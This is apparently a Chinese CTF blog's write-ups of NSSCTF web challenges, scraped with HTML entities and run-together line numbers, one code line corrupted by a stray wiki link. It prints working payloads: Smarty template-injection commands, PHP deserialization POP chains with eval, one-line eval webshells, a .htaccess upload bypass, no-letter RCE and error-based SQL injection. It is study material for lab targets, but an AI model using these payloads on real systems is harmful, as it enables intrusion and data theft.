sqlite3.IntegrityError: return &quot;Duplicate file&quot; conn.commit() file.save(&#x27;uploads/&#x27; + file.filename) return redirect(&#x27;/file/&#x27; + uid) 首先是post方式传递路径名字，然后又出现了过滤，表示如果路径名出现了 . ，那就返回403，即上传的文件不能有后缀名 12if &quot;.&quot; in file.filename: return &quot;Bad filename!&quot;, 403 上传文件后生成一个uuid，并将uuid和文件名存入数据库中，并返回文件的uuid。再通过/file/uuid访问文件，通过查询数据库得到对应文件名，在文件名前拼接uploads/后读取该路径下上传的文件。 12345678910 try: cur.execute(&quot;insert into files (id, path) values (?, ?)&quot;, (uid, file.filename,)) except sqlite3.IntegrityError: return &quot;Duplicate file&quot; conn.commit() 和with open(os.path.join(&quot;uploads/&quot;, res[0]), &quot;r&quot;) as f: return f.read() 上传的文件没有后缀名，不能直接利用，所以就要利用os.path.join()函数漏洞 os.path.join()函数漏洞绝对路径拼接漏洞 os.path.join(path,paths)函数用于将多个文件路径连接成一个组合的路径。第一个函数通常包含了基础路径，而之后的每个参数被当作组件拼接到基础路径之后。然而，这个函数有一个少有人知的特性，如果拼接的某个路径以 / 开头，那么包括基础路径在内的所有前缀路径都将被删除，该路径将视为绝对路径所以当上传的文件名为 &#x2F;flag时 ，那么进行路径拼接时，uploads&#x2F; 将被删除，读取到的就是根目录下的 flag 文件。因此我们只需要传输一个文件名为&#x2F;flag的文件就可以得到flag的uid。然后再访问对应路径就可以得到flag直接上传个一句话木马，然后抓包改文件名为&#x2F;flag，然后访问对应路径，&#x2F;file&#x2F;bbfce872aa9a4b26b069edf5776f7389，就可以得到flagNSSCTF{6b791264-a4c6-4b3d-940d-a0044ef1d0f9} [CISCN 2019华东南]Web11抓包看一下，没有什么发现但是我们看到环境的页面有，XFF头，这个算是给我们的一个提示了 Smarty 模板注入控制XFF进行命令执行（这是要在前端有IP相关回显的情况）payload: 123456789101112131415161718X-Forwarded-For: &#123;&#123;system(&quot;ls&quot;)&#125;&#125;&#123;$smarty.version&#125; //smarty的版本号有下面几种标签可以利用：可以使用&#123;php&#125;&#123;/php&#125;标签来执行被包裹其中的php指令&#123;php&#125;phpinfo();&#123;/php&#125; Smarty已经废弃&#123;php&#125;标签，强烈建议不要使用。在Smarty 3.1，&#123;php&#125;仅在SmartyBC中可用。&#123;literal&#125; 标签 &#123;literal&#125;可以让一个模板区域的字符原样输出。 这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。&#123;if&#125;标签&#123;if phpinfo()&#125;&#123;/if&#125; 其中，我个人感觉if标签是最常用的，有一些常用的payload 12345&#123;if phpinfo()&#125;&#123;/if&#125;&#123;if system(&#x27;ls&#x27;)&#125;&#123;/if&#125;&#123; readfile(&#x27;/flag&#x27;) &#125;&#123;if show_source(&#x27;/flag&#x27;)&#125;&#123;/if&#125;&#123;if system(&#x27;cat ../../../flag&#x27;)&#125;&#123;/if&#125; 那这一题，我们直接添加XFF头，然后进行命令执行即可 1X-Forwarded-For:&#123;if system(&#x27;cat /flag&#x27;)&#125;&#123;/if&#125; NSSCTF{6616e149-8544-417a-9dc5-a4eabd92ccb3} [HUBUCTF 2022 新生赛]checkin打开环境，看到源码 12345678910111213141516 &lt;?php show_source(__FILE__); $username = &quot;this_is_secret&quot;; $password = &quot;this_is_not_known_to_you&quot;; include(&quot;flag.php&quot;);//here I changed those two $info = isset($_GET[&#x27;info&#x27;])? $_GET[&#x27;info&#x27;]: &quot;&quot; ; $data_unserialize = unserialize($info); if ($data_unserialize[&#x27;username&#x27;]==$username&amp;&amp;$data_unserialize[&#x27;password&#x27;]==$password)&#123; echo $flag; &#125;else&#123; echo &quot;username or password error!&quot;; &#125; ?&gt; username or password error! 说实话，这题只有一颗星不到的难度，但是我看到的时候真觉得哪有那么简单后面看了下评论区，说小心不要被骗了，于是，再好好来看下代码首先我们可以确定的是，我们需要GET传参一个info看到，他给了个注释，提示他这里改变了username和password这两个参数的值所以这里我们是没有办法比较的，因为我们也不知道他改成了啥但是，这里可以利用一个特性 弱类型比较：true与非零非NULL变量比较布尔类型True与非零非NULL变量比较都会是True。所以我们这里只要把info里的username和password都赋值为true就可以exp如下： 12345678&lt;?php $a = [ &#x27;username&#x27; =&gt; true, &#x27;password&#x27; =&gt; true ]; $info = serialize($a); echo $info; ?&gt; payload如下： 1?info=a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125; NSSCTF{930a9638-050f-44f3-afe0-1fcefd52ae67} [NISACTF 2022]babyserialize反序列化构造pop链（很多魔术方法结合）源码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&lt;?php include &quot;waf.php&quot;; class NISA&#123; public $fun=&quot;show_me_flag&quot;; public $txw4ever; public function __wakeup() &#123; if($this-&gt;fun==&quot;show_me_flag&quot;)&#123; hint(); &#125; &#125; function __call($from,$val)&#123; $this-&gt;fun=$val[0]; &#125; public function __toString() &#123; echo $this-&gt;fun; return &quot; &quot;; &#125; public function __invoke() &#123; checkcheck($this-&gt;txw4ever); @eval($this-&gt;txw4ever); &#125; &#125; class TianXiWei&#123; public $ext; public $x; public function __wakeup() &#123; $this-&gt;ext-&gt;nisa($this-&gt;x); &#125; &#125; class Ilovetxw&#123; public $huang; public $su; public function __call($fun1,$arg)&#123; $this-&gt;huang-&gt;fun=$arg[0]; &#125; public function __toString()&#123; $bb = $this-&gt;su; return $bb(); &#125; &#125; class four&#123; public $a=&quot;TXW4EVER&quot;; private $fun=&#x27;abc&#x27;; public function __set($name, $value) &#123; $this-&gt;$name=$value; if ($this-&gt;fun = &quot;sixsixsix&quot;)&#123; strtolower($this-&gt;a); &#125; &#125; &#125; if(isset($_GET[&#x27;ser&#x27;]))&#123; @unserialize($_GET[&#x27;ser&#x27;]); &#125;else&#123; highlight_file(__FILE__); &#125; //func checkcheck($data)&#123; // if(preg_match(......))&#123; // die(something wrong); // &#125; //&#125; //function hint()&#123; // echo &quot;.......&quot;; // die(); //&#125; ?&gt; 这里先写出反序列化常见的魔术方法的调用方法 12345678910__invoke():以调用函数的方式调用对象的时候，就会调用该方法__construst():具有构造函数的类在创建新对象的时候，回调此方法__destruct():反序列化的时候，或者对象销毁的时候调用__wakeup():反序列化的时候调用__sleep():序列化的时候调用__toString():把类当成字符串的时候调用，一般在echo处生效__set():在给不可访问的(protected或者private)或者不存在的属性赋值的时候，会被调用__get():读取不可访问或者不存在的属性的时候，进行赋值__call():在对象中调用一个不可访问的方法的时候，会被执行 首先最后肯定是__invoke() 魔术方法里的eval()函数然后就是 Ilovetxw这个类中的__toString()方法，用来触发__invoke()之后看到__set()方法，这种方法中的 strtolower()函数，这个函数的功能是把字符串全部转化为小写用从__set()反推到__call()，而__call()方法中的fun变量是在four类中定义的私有变量然后由__call()又反推到了__wakeup()方法，而__wakeup()中的nisa()方法，根本不存在，所以成功无法调用，进而成功触发了__call()所以总的链子为： 1NISA(__invoke())--&gt;Ilovetxw(__toString())--&gt;four(__set())--&gt;Ilovetxw(__call())--&gt;TianXiWei(__wakeup()) exp如下： 12345678910111213141516171819202122232425262728&lt;?php class NISA&#123; public $fun; public $txw4ever=&#x27;system(&quot;ls&quot;);&#x27;;&#125; class TianXiWei&#123; public $ext; public $x; &#125; class Ilovetxw&#123; public $huang; public $su; &#125; class four&#123; public $a; private $fun=&#x27;abc&#x27;; &#125; $qw=new TianXiWei; //创建对象，入口为__wakeup()方法，所以new其所在的类$qw-&gt;ext=new Ilovetxw; //__call()$qw-&gt;ext-&gt;huang=new four; //__set()$qw-&gt;ext-&gt;huang-&gt;a=new Ilovetxw; //__toString()$qw-&gt;ext-&gt;huang-&gt;a-&gt;su=new NISA; //__invoke()echo urlencode(serialize($qw)); //有private属性的变量，所以序列化之后有不可见字符，所以要urlencode?&gt; 然后payload为： 1?ser=O%3A9%3A%22TianXiWei%22%3A2%3A%7Bs%3A3%3A%22ext%22%3BO%3A8%3A%22Ilovetxw%22%3A2%3A%7Bs%3A5%3A%22huang%22%3BO%3A4%3A%22four%22%3A2%3A%7Bs%3A1%3A%22a%22%3BO%3A8%3A%22Ilovetxw%22%3A2%3A%7Bs%3A5%3A%22huang%22%3BN%3Bs%3A2%3A%22su%22%3BO%3A4%3A%22NISA%22%3A2%3A%7Bs%3A3%3A%22fun%22%3BN%3Bs%3A8%3A%22txw4ever%22%3Bs%3A13%3A%22system%28%22ls%22%29%3B%22%3B%7D%7Ds%3A9%3A%22%00four%00fun%22%3Bs%3A3%3A%22abc%22%3B%7Ds%3A2%3A%22su%22%3BN%3B%7Ds%3A1%3A%22x%22%3BN%3B%7D; 显示something wrong,看着源码里的最后的几行，猜测可能是过滤了某些东西，经过测试之后，发现是过滤了system，把system改成SysTEm,大小写绕过即可 12345678910//func checkcheck($data)&#123; // if(preg_match(......))&#123; // die(something wrong); // &#125; //&#125; //function hint()&#123; // echo &quot;.......&quot;; // die(); //&#125; 所以最后的payload为: 123?ser=O%3A9%3A%22TianXiWei%22%3A2%3A%7Bs%3A3%3A%22ext%22%3BO%3A8%3A%22Ilovetxw%22%3A2%3A%7Bs%3A5%3A%22huang%22%3BO%3A4%3A%22four%22%3A2%3A%7Bs%3A1%3A%22a%22%3BO%3A8%3A%22Ilovetxw%22%3A2%3A%7Bs%3A5%3A%22huang%22%3BN%3Bs%3A2%3A%22su%22%3BO%3A4%3A%22NISA%22%3A2%3A%7Bs%3A3%3A%22fun%22%3BN%3Bs%3A8%3A%22txw4ever%22%3Bs%3A15%3A%22SysTEm%28%22ls+%2F%22%29%3B%22%3B%7D%7Ds%3A9%3A%22%00four%00fun%22%3Bs%3A3%3A%22abc%22%3B%7Ds%3A2%3A%22su%22%3BN%3B%7Ds%3A1%3A%22x%22%3BN%3B%7D?ser=O%3A9%3A%22TianXiWei%22%3A2%3A%7Bs%3A3%3A%22ext%22%3BO%3A8%3A%22Ilovetxw%22%3A2%3A%7Bs%3A5%3A%22huang%22%3BO%3A4%3A%22four%22%3A2%3A%7Bs%3A1%3A%22a%22%3BO%3A8%3A%22Ilovetxw%22%3A2%3A%7Bs%3A5%3A%22huang%22%3BN%3Bs%3A2%3A%22su%22%3BO%3A4%3A%22NISA%22%3A2%3A%7Bs%3A3%3A%22fun%22%3BN%3Bs%3A8%3A%22txw4ever%22%3Bs%3A27%3A%22SysTEM%28%22cat+%2Ffllllllaaag%22%29%3B%22%3B%7D%7Ds%3A9%3A%22%00four%00fun%22%3Bs%3A3%3A%22abc%22%3B%7Ds%3A2%3A%22su%22%3BN%3B%7Ds%3A1%3A%22x%22%3BN%3B%7D NSSCTF{ba4813c0-9e91-4446-829c-d004ed064d52}这道题我还看到了一个师傅的另解，太强了！ 1234567891011class NISA&#123; public $txw4ever=&#x27;SYSTEM(&quot;cat /f*&quot;);&#x27;; &#125; class Ilovetxw&#123; &#125; $a = new NISA(); $a-&gt;fun = ne[[【Web漏洞】SSTI]]w Ilovetxw(); $a-&gt;fun-&gt;su = $a; $a = serialize($a); echo $a; 在NISA:: _ _ wakeup里，做弱比较的时候就能触发__toString [NISACTF 2022]bingdundun~打开环境是一个文件上传的界面但是页面的一句话，算是一个提示吧仅可以上传墩墩喜欢的【图片或压缩包】文件类型哦这里说压缩包，我们很容易想到一个伪协议 phar:&#x2F;&#x2F;伪协议如果同时存在可以上传图片的功能，那我们就可以利用phar:&#x2F;&#x2F;伪协议，如果只能上传zip压缩包文件，那就用zip:&#x2F;&#x2F;伪协议，如果只能上传txt文件，那就用phar:&#x2F;&#x2F;伪协议。phar:// 跟zip: //协议差不多，都是可以访问zip格式压缩包内容这里我直接把一句话木马压缩进压缩包，生成1.zip然后显示 1/var/www/html\\/xxxxxxxxxxxxxxxxxxxxxxxx.zip 成功上传了冰墩墩喜爱的文件，然后呢？ 然后访问 12http://x.x.x:xxxxx/?bingdundun=phar://xxxxxxxxxxxxxxxxxxxxxxxx.zip/1//注意无论是什么后缀，phar://伪协议会在末尾默认加一个php后缀，所以我们不用加后缀了 然后getshell即可（这里是允许上传压缩包的，但是万一只允许上传图片的话，可以把php文件打包成zip文件，然后改zip文件的后缀为图片（jpg.png之类的）然后再类似的访问即可：?file&#x3D;phar:&#x2F;&#x2F;upload&#x2F;shell.png&#x2F;shell） [SWPUCTF 2022 新生赛]ez_ez_php打开，源码如下： 123456789101112131415 &lt;?php error_reporting(0); if (isset($_GET[&#x27;file&#x27;])) &#123; if ( substr($_GET[&quot;file&quot;], 0, 3) === &quot;php&quot; ) &#123; echo &quot;Nice!!!&quot;; include($_GET[&quot;file&quot;]); &#125; else &#123; echo &quot;Hacker!!&quot;; &#125; &#125;else &#123; highlight_file(__FILE__); &#125; //flag.php 呀，没有什么好说的，file参数的开头三个字符要是php然后提示有有flag.php文件，直接php:&#x2F;&#x2F;filter伪协议读取flag.php php:&#x2F;&#x2F;filter伪协议123?file=php://filter/read=convert.base64-encode/resource=flag.php//提示真的flag在flag文件中?file=php://filter/read=convert.base64-encode/resource=flag 然后base64解密即可NSSCTF{4bf4e46c-0f42-4cdf-8d73-2dc4687a1cdb} [NISACTF 2022]midlevel这道题的页面打开和前面那道web11的smarty模板注入的页面只能说是一模一样了那就直接照那题的打法试一试 1X-Forwarded-For:&#123;if system(&#x27;cat /f*&#x27;)&#125;&#123;/if&#125; 直接得到flagNSSCTF{3303c48f-0195-4b88-a682-c0ba6f40f250} [UUCTF 2022 新生赛]websign打开，提示我们查看源代码浏览器打开开发者工具直接查看源代码，就得到了flagNSSCTF{4d7ea0a0-423f-43f9-9d1a-63c499447864} [GXYCTF 2019]BabyUpload首先试一下直接上传php文件，芜湖，似乎不行上传jpg后缀文件，抓包改后缀为php,phtml之类的都不行那就试试.htaccess 文件上传.htaccess但是在上传.htaccess文件时，显示这上传的文件类型太露骨了然后再上传改了后缀的一句话木马时，显示这明显还是php啊那证明可能也有检测我们上传文件的文件内容首先既然提示上传的文件类型太露骨了，那可能是检测了MIME类型 MIME类型检测我们上传了.htaccess之后抓包改改Content-Type头试试把原来的类型改为我蓝色箭头标上的jpg类型然后就提示上传成功 1/var/www/html/upload/b9c2691f3e170da763f746d557d1fb58/.htaccess succesfully uploaded! 然后那个说别懵他，明显还是php啊这里我们试试用其他的一句话木马来代替php的&lt; ?标签，把1.jpg改为下面的内容 无php标签的script一句话木马12GIF89a&lt;script language=&#x27;php&#x27;&gt;@eval($_POST[&quot;qw&quot;]);&lt;/script&gt; 然后发现1.jpg也上传成功 1/var/www/html/upload/b9c2691f3e170da763f746d557d1fb58/1.jpg succesfully uploaded! 我们访问一下，发现可以看到显示了GIF头，但是我们POST传参，qw&#x3D;system(“ls”);之类的却没有任何反应我们传入 qw&#x3D;phpinfo()查看一下，发现禁止了很多内置函数 show_source() 函数–禁止了很多内置函数时使用这里就要提一下这个函数了show_source() 函数对文件进行语法高亮显示。 show_source(filename,return) 本函数是 highlight_file 的别名。 filename 必需。要进行高亮处理的 PHP 文件的路径。return 可选。如果设置 true，则本函数返回高亮处理的代码。所以这道题的payload如下 1qw=show_source(&#x27;/flag&#x27;); 然后这里也可以在访问成功，显示了GIF89a的时候就用蚁剑连接也可以找到flag [GDOUCTF 2023]hate eat snake这个题在这个比赛的wp中我发过了 js逻辑漏洞硬玩，反正我不行查看一下网页源代码，找到js文件看到有一段很长的代码，然后划到最后去有alert前面有一个if判断语句 12if(this[&#x27;getScore&#x27;]()&gt;-0x1e9*-0xf+0x5*0x6d+-0x2e*0xaa)return alert(_0x324fcb(0x2d9,0x2c3,0x2db,0x2f3)+&#x27;k3r_h0pe_t&#x27;+_0xe4a674(0x5a1,0x595,0x59e,0x57c)+&#x27;irlfriend&#125;&#x27;),![]; 所以我们只要把if里面的语句改为真，那就可以成功出现弹窗，所以我们可以把if里面的判断条件改成1&#x3D;1找个js网站运行一下,就可以弹出flag，或者直接删去if语句，只留下alert语句然后在控制台执行也可以弹出flag然后还有的解是直接撞墙死了，然后弹窗按取消，然后等待一分钟，再次按空格开始，也会弹出flagNSSCTF{J_0k3r_h0pe_to_have_@_girlfriend} [LitCTF 2023]PHP是世界上最好的语言！！打开页面是一个加密的页面，如下 然后我们就在那个run code那个框里输入一些我们的代码，先试试 123&lt;?phpphpinfo();?&gt; 可以执行，题目又提示flag在根目录，所以 123&lt;?phpsystem(&quot;ls /&quot;); //然后再是system(&quot;cat /f*&quot;)?&gt; NSSCTF{206865c6-cf0a-4688-80e5-9c4ba625e85a}","categories":[{"name":"CTF做题wp","slug":"CTF做题wp","permalink":"https://qingwan.top/categories/CTF%E5%81%9A%E9%A2%98wp/"}],"tags":[],"author":"Qingwan"},{"title":"NSSCTF刷题记录②--web","slug":"nss②","date":"2024-01-08T05:59:52.922Z","updated":"2024-01-08T06:48:46.509Z","comments":true,"path":"2024/01/08/nss②/","link":"","permalink":"https://qingwan.top/2024/01/08/nss%E2%91%A1/","excerpt":"比较基础的一些web题②","text":"比较基础的一些web题② [ZJCTF 2019]NiZhuanSiWei 12345678910111213141516171819&lt;?php $text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];$password = $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123; echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file))&#123; echo &quot;Not now!&quot;; exit(); &#125;else&#123; include($file); //useless.php $password = unserialize($password); echo $password; &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 这道题，首先明白需要我们GET传参三个参数 然后我们需要绕过file_get_contents()函数 file_get_contents()绕过file_get_contents()的绕过用伪协议绕过，有下面几种用法： 用php://input伪协议绕过 （用于执行post中的php代码） 如果是GET传参： ?xxx=php://input 如果是POST传参： ?fn=php://input 然后再post传入想要传进的值 注意：enctype=&quot;multipart/form-data&quot; 的时候 php://input 是无效的 用data://伪协议绕过 （ 自PHP&gt;=5.2.0起，可以使用data://数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。一般需要用到base64编码传输 ） ?xxx=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=(base64加密之后，需要传入的值） 这里是第一层伪协议，然后后面我们看到包含了一个useless.php文件，我们需要读取他，看到include，我们又想到了伪协议 用下面的php://filter伪协议来读取数据 ?xxx=php://filter/read=convert.base64-encode/resource=文件名 然后看到password是需要序列化的，我们猜测可能还有一层代码在useless.php中 我们先GET传参： ?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php 然后把得到的数据base64解密一下 123456789101112```&lt;?php class Flag&#123; //flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;U R SO CLOSE !///COME ON PLZ&quot;); &#125; &#125; &#125; ?&gt; 大概意思就是把flag.php赋值给filepoc如下 12345678910111213141516&lt;?php class Flag&#123; //flag.php public $file=&quot;flag.php&quot;; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;U R SO CLOSE !///COME ON PLZ&quot;); &#125; &#125; &#125; $QW=new Flag(); echo serialize($QW);?&gt; 最后payload如下： ?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 然后查看源代码即可得到flag （这里最后的payload，file参数没有用伪协议了，这是为什么捏。其实这是因为 php:&#x2F;&#x2F;filter 伪协议，是把整个php文件，从一个可执行的状态变成了文本状态。 你已经用伪协议，把php文件给处理成文本状态了，自然就不能接着执行反序列化的代码了， 毕竟txt文本是没办法当作代码运行的。） [BJDCTF 2020]easy_md5打开环境是一个查询框，输入啥都没有什么反应。 查看一下响应头，发现下面这样一个提示，是一个sql注入 hint select * from &#39;admin&#39; where password=md5($pass,true) 里面的password就是我们输入的参数，这里就来到第一个考点了 md5(passwrod,true) 这里涉及到一个知识点，就是md5()函数中，如果第二个参数设为true，返回的是二进制内容，如果能用到类似’or之类的字符串，就可以构成SQL注入。 比如，一个网上说到最多的： ffifdyopmd5值为：276f722736c95d99e921722cf9ed621c再转换为字符串为&#39;or&#39;6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1c 这样拼接之后就是 select * from &#39;admin&#39; where password=&#39; &#39;or &#39;6...&#39; 所以相当于形成了一个万能密码，构成永真 所以这里我们第一步就是在查询框输入：ffifdyop 然后来到下一个界面，查看源代码，发现了这样一段提示代码 12345678&lt;!--$a = $GET[&#x27;a&#x27;];$b = $_GET[&#x27;b&#x27;];if($a != $b &amp;&amp; md5($a) == md5($b))&#123; header(&#x27;Location: levell14.php&#x27;);--&gt; 12345我们看到其实就是一个md5弱类型的比较，在刷题记录①的里提到过，就用数组绕过?a[]=1&amp;b[]=2然后就又发现了一段代码 123456789 &lt;?phperror_reporting(0);include &quot;flag.php&quot;;highlight_file(__FILE__);if($_POST[&#x27;param1&#x27;]!==$_POST[&#x27;param2&#x27;]&amp;&amp;md5($_POST[&#x27;param1&#x27;])===md5($_POST[&#x27;param2&#x27;]))&#123; echo $flag;&#125; 好的这里就是md5的强比较了，之前也说过这里也是用数组绕过，post传参 paraml[]=1&amp;param2=2 [SWPUCTF 2021 新生赛]easyupload3.0打开环境是一个上传文件的界面 文件上传– .htaccess htaccess文件时Apache服务中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮助我们实现：网页301重定向、自定义404错误页面，改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问，禁止目录列表，配置默认文档等功能 其中.htaccess文件内容：SetHandler application&#x2F;x-http-php的意思是设置当前目录所有文件都使用php解析，那么无论上传任何文件，只要符合php语言代码规范，就会被当做PHP执行。不符合规则则报错 所以当我们没有办法上传其他文件时，我们可以通过上传.htaccess文件来getshell 我们首先新建一个.htaccess文件，内容如下 123&lt;FilesMatch &quot;1.jpg&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 我们先把.htaccess文件上传上去，然后再上传一句话木马（记住要把文件名改成1.jpg) 然后蚁剑连接 http://...../upload/1.jpg [SWPUCTF 2021 新生赛]PseudoProtocols打开环境，提示要我们读取hint.php php:&#x2F;&#x2F;filter伪协议1?wllm=php://filter/read=convert.base64-encode/resource=hint.php （这里要base64过滤器才读的出来）解密base64，提示访问 /test2222222222222.php这个路径然后看到了源码 12345678&lt;?php ini_set(&quot;max_execution_time&quot;, &quot;180&quot;); show_source(__FILE__); include(&#x27;flag.php&#x27;); $a= $_GET[&quot;a&quot;]; if(isset($a)&amp;&amp;(file_get_contents($a,&#x27;r&#x27;)) === &#x27;I want flag&#x27;)&#123; echo &quot;success\\n&quot;; echo $flag; &#125; ?&gt; 其中ini_set(&quot;max_execution_time&quot;, &quot;180&quot;);表示脚本执行时间就为180秒然后file_get_contents($a,&#39;r&#39;)) === &#39;I want flag表示用只读的方式读取变量啊然后变量a的值为后面那串字符串这里就用data伪协议来绕过test2222222222222.php?a=data://text/plain;base64,SSB3YW50IGZsYWc=然后就得到了flag [SWPUCTF 2021 新生赛]hardrce12345678910111213141516171819202122232425 &lt;?php header(&quot;Content-Type:text/html;charset=utf-8&quot;); error_reporting(0); highlight_file(__FILE__); if(isset($_GET[&#x27;wllm&#x27;])) &#123; $wllm = $_GET[&#x27;wllm&#x27;]; $blacklist = [&#x27; &#x27;,&#x27;\\t&#x27;,&#x27;\\r&#x27;,&#x27;\\n&#x27;,&#x27;\\+&#x27;,&#x27;\\[&#x27;,&#x27;\\^&#x27;,&#x27;\\]&#x27;,&#x27;\\&quot;&#x27;,&#x27;\\-&#x27;,&#x27;\\$&#x27;,&#x27;\\*&#x27;,&#x27;\\?&#x27;,&#x27;\\&lt;&#x27;,&#x27;\\&gt;&#x27;,&#x27;\\=&#x27;,&#x27;\\`&#x27;,]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $wllm)) &#123; die(&quot;LTLT说不能用这些奇奇怪怪的符号哦！&quot;); &#125;&#125; if(preg_match(&#x27;/[a-zA-Z]/is&#x27;,$wllm)) &#123; die(&quot;Ra&#x27;s Al Ghul说不能用字母哦！&quot;); &#125; echo &quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;; eval($wllm); &#125; else &#123; echo &quot;蔡总说：注意审题！！！&quot;; &#125; ?&gt; 蔡总说：注意审题！！！ 看到了过滤了那些字符和字母然后要RCE 无字母RCE这里有三个方法 异或这里用system(ls)会报错(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%0c%08&quot;^&quot;%60%7b&quot;);所以异或应该不行，可以采用取反绕过 取反123456789&lt;?php$a = &quot;system&quot;;$b = &quot;cat /f*&quot;;echo urlencode(~$a);print(&quot;\\n&quot;);echo urlencode(~$b);?&gt; 最后Payload为/?wllm=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%D5); [NISACTF 2022]easyssrf看题目就知道是ssrf这里要我们curl一个网站(没有思路，网上看的wp)我看完是感觉有点谜语题的感觉了这里说是curl网站，其实是要我们访问一个路径试一下 1234/flag //得到提示：都说了这里看不了flag。。但是可以看看提示文件：/fl4g//访问一个路径，就用伪协议：file:///fl4g （不知道为什么//不行，///才行）然后又发现提示：你应该看看除了index.php，是不是还有个ha1x1ux1u.php然后就直接访问后面那个文件，看到一段源码 12345678910111213 &lt;?php highlight_file(__FILE__); error_reporting(0); $file = $_GET[&quot;file&quot;]; if (stristr($file, &quot;file&quot;))&#123; die(&quot;你败了.&quot;); &#125; //flag in /flag echo file_get_contents($file); 然后直接传参即可 ： ?file=/flag [SWPUCTF 2021 新生赛]error打开环境，看到显示了sqli，然后根据名字判断可能是报错注入报错注入是通过特殊函数错误的使用并且输出错误的结果来获取信息的 报错注入extractvalue()函数：函数原型：extractvalue(xml_document,Xpath_string)正常语法：extractvalue(xml_document,Xpath_string);第一个参数：xml_document是string格式，为xml文档对象的名称第二个参数：Xpath_string是xpath格式的字符串作用：从目标xml中返回包含所查询值的字符串 payload如下 1234567891011121 //显示id=11&#x27; //报错1&#x27; and extractvalue(null,concat(&#x27;~&#x27;,(database()),&#x27;~&#x27;))# //返回test_db/*在extractvalue()函数的第一个位置写null，使其故意报错,因为第一个位置本来应该写string格式的字符因为第一个位置报错，所以他会进而执行第二个位置上的语句，但是第二个位置上也不是正确的查询语句，所以会报错，进而也返回查询的结果*/1&#x27; and extractvalue(null,concat(&#x27;~&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;test_db&#x27;),&#x27;~&#x27;))# //返回test_tb,users1&#x27; and extractvalue(null,concat(&#x27;~&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),&#x27;~&#x27;))# //返回USER,CURRENT_CONNECTIONS,TOTAL_1&#x27; and extractvalue(null,concat(&#x27;~&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;test_tb&#x27;),&#x27;~&#x27;))# //返回id,flag1&#x27; and updatexml(null,concat(&#x27;~&#x27;,(select group_concat(id,&#x27;~&#x27;,flag) from test_tb),&#x27;~&#x27;),1)#//返回：&#x27;~1~NSSCTF&#123;bfcd1575-b56b-4ee6-909&#x27; ，哟西，这好像只有一半啊 这里思考一下，还有一半会在哪里 报错注入显示不全的问题123456789101112131415161718192021222324252627282930这里我想的是会不会是他没有显示完全？我试了一下：1&#x27; and updatexml(null,concat(&#x27;~&#x27;,(select group_concat(flag) from test_tb ),&#x27;~&#x27;),1)#发现回显：NSSCTF&#123;bfcd1575-b56b-4ee6-9091-那证明确实是没有显示完全，于是我就去找了可以显示完全的方法第一个方法是用：limit 0,1limit子句用于限制查询结果返回的数量，常用于分页查询比如：&#x27;&quot; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)--+limit子句含有两个参数，第一个参数表示从第几行数据开始查，第二个参数表示查几条数据要注意的是group_concat和limit不能同时使用但是这里我试了一下：1&#x27; and updatexml(null,concat(&#x27;~&#x27;,(select flag from test_tb limit 0,1 ),&#x27;~&#x27;),1)#还是和之前一样只显示一半，没有任何用第二个方法：使用mid()函数MID 函数用于从文本字段中提取字符。其中第一个参数是要提取的表名，第二个参数为起始位置，第三个参数为返回的字符个数这里试一下：1&#x27; and updatexml(null,concat(&#x27;~&#x27;,mid((select group_concat(flag) from test_tb ),1,50),&#x27;~&#x27;),1)#哟西，还是一样的，没有用！！！！！！！！！！但是最后我发现是有用的，如果是从1开始截取，取50个的话就不行但是下面的就可以，咱一次少取点：1&#x27; and updatexml(null,concat(&#x27;~&#x27;,mid((select group_concat(flag) from test_tb ),1,20),&#x27;~&#x27;),1)# //从1开始取20位1&#x27; and updatexml(null,concat(&#x27;~&#x27;,mid((select group_concat(flag) from test_tb ),15,20),&#x27;~&#x27;),1)#//从第15位往后取20位1&#x27; and updatexml(null,concat(&#x27;~&#x27;,mid((select group_concat(flag) from test_tb ),30,20),&#x27;~&#x27;),1)#//从第30位往后取20位然后把三次回显的数据，拼在一起即可 NSSCTF&#123;838bbc8a-d338-4e3a-83e7-31154205aeeb&#125; [SWPUCTF 2021 新生赛]pop反序列化，源码如下 123456789101112131415161718192021222324252627282930313233343536373839404142 &lt;?php error_reporting(0); show_source(&quot;index.php&quot;); class w44m&#123; private $admin = &#x27;aaa&#x27;; protected $passwd = &#x27;123456&#x27;; public function Getflag()&#123; if($this-&gt;admin === &#x27;w44m&#x27; 